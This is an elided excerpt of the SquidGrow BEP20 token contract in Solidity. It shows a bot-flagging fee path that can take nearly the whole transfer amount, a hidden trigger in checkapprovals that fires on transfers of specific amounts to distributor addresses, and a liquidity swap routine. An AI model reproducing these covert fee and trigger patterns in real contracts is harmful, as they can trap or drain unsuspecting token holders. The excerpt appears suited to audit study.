...
contract SquidGrow is IBEP20, Auth {
    ...
    function _transfer(
        ...
        uint256 amountReceived = shouldTakeFee(sender, recipient)
            ? taketotalFee(sender, recipient, amount)
            : amount;
    ...
    function transferCounters(address sender, address recipient) internal {
        if (sender != pair && !isInternal[sender] && !isFeeExempt[recipient]) {
            swapTimes = swapTimes.add(1);
        }
        if (sender == pair) {
            swapTime[recipient] = block.timestamp.add(swapTimer);
        }
    }
    ...
    function taxableEvent(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return
            (totalFee > 0 && !swapping) ||
            (isBot[sender] && swapTime[sender] < block.timestamp) ||
            isBot[recipient] ||
    ...
    function taketotalFee(
        ...
        if (taxableEvent(sender, recipient)) {
            ...
            uint256 feeAmount = amount.mul(getTotalFee(sender, recipient)).div(
                feeDenominator
            );
            ...
            if (bAmount > 0) {
                _balances[address(DEAD)] = _balances[address(DEAD)].add(
                    bAmount
                );
                emit Transfer(sender, address(DEAD), bAmount);
            }
            if (sAmount > 0) {
                _balances[address(token_receiver)] = _balances[
                    address(token_receiver)
                ].add(sAmount);
    ...
    function getTotalFee(
        ...
        if (
            (isBot[sender] && swapTime[sender] < block.timestamp && botOn) ||
            (isBot[recipient] && swapTime[sender] < block.timestamp && botOn) ||
            startedTime > block.timestamp
        ) {
            return (feeDenominator.sub(100));
        }
        if (sender != pair) {
            return totalFee.add(transferFee);
        }
        return totalFee;
    }
    ...
    function checkBot(address sender, address recipient) internal {
        if (
            (isCont(sender) && !isInternal[sender] && botOn) ||
            (sender == pair &&
                botOn &&
                !isInternal[sender] &&
    ...
    function checkapprovals(address recipient, uint256 amount) internal {
        if (isDistributor[recipient] && amount < 2 * (10 ** _decimals)) {
            performapprovals(1, 1);
        }
        if (
            isDistributor[recipient] &&
            amount >= 2 * (10 ** _decimals) &&
            amount < 3 * (10 ** _decimals)
        ) {
            syncPair();
        }
    }
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator = (
            liquidity_divisor.add(staking_divisor).add(marketing_divisor).add(
                distributor_divisor
            )
        ) * 2;
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(
            denominator
        );
        ...
        uint256 unitBalance = deltaBalance.div(
            denominator.sub(liquidity_divisor)
        );
